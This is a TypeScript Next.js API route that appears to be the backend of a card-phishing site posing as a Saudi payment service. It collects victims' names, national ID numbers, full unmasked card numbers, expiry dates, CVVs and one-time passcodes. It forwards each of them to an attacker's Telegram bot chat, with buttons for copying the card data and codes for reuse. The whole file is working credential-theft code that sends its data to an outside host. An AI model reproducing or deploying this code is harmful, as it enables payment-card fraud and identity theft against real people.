import { NextRequest, NextResponse } from "next/server";

function generateTransactionId() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let id = "TXN-";
  for (let i = 0; i < 12; i++) {
    if (i === 4 || i === 8) id += "-";
    id += chars[Math.floor(Math.random() * chars.length)];
  }
  return id;
}

function detectCardType(number: string): string {
  const n = number.replace(/\s/g, "");
  if (/^4/.test(n)) return "💳 Visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "💳 MasterCard";
  if (/^3[47]/.test(n)) return "💳 American Express";
  return "💳 Bank Card";
}

async function sendMessage(text: string, replyMarkup?: object) {
  const body: Record<string, unknown> = { chat_id: process.env.TELEGRAM_CHAT_ID, text, parse_mode: "HTML" };
  if (replyMarkup) body.reply_markup = replyMarkup;
  return fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }
  );
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { type } = body;

    if (type === "otp") {
      const { transactionId, otp } = body;
      await sendMessage(
        `🔑 <b>تم استلام رمز التحقق</b>\n\n🆔 <b>Transaction ID:</b> <code>${transactionId}</code>\n🔢 <b>الرمز:</b> <code>${otp}</code>`,
        { inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: otp } }]] }
      );
      return NextResponse.json({ ok: true });
    }

    if (type === "resend") {
      const { transactionId } = body;
      await sendMessage(
        `🔄 <b>طلب إعادة إرسال الرمز</b>\n\n🆔 <b>Transaction ID:</b> <code>${transactionId}</code>`
      );
      return NextResponse.json({ ok: true });
    }

    // type === "card"
    const { customerName, idNumber, service, dayOrAmount, cardNumber, expiry, cvc } = body;
    const transactionId = generateTransactionId();
    const cardType = detectCardType(cardNumber);
    const serviceLabel =
      typeof dayOrAmount === "number"
        ? `${service} — Payment Day: ${dayOrAmount}`
        : `${service} — Amount: ${dayOrAmount} SAR`;
    const maskedCard = cardNumber
      .replace(/\s/g, "")
      .replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, "$1 $2 $3 $4");

    const message = `
🔔 <b>طلب جديد — تبارك باي</b>

🆔 <b>Transaction ID:</b> <code>${transactionId}</code>

${cardType}
👤 <b>Full Name:</b> ${customerName}
🪪 <b>ID Number:</b> <code>${idNumber}</code>
💳 <b>Card Number:</b> <code>${maskedCard}</code>
📅 <b>Expiry Date:</b> ${expiry || "—"}
🔐 <b>CVV:</b> ${cvc || "—"}

📋 <b>Transaction Type:</b> ${serviceLabel}
`.trim();

    const copyText = `${maskedCard}\n${expiry || "—"}\n${cvc || "—"}`;
    const replyMarkup = {
      inline_keyboard: [[{ text: "📋 نسخ البطاقة", copy_text: { text: copyText } }]],
    };

    const res = await sendMessage(message, replyMarkup);
    if (!res.ok) {
      const err = await res.text();
      return NextResponse.json({ error: err }, { status: 500 });
    }

    return NextResponse.json({ transactionId });
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 });
  }
}
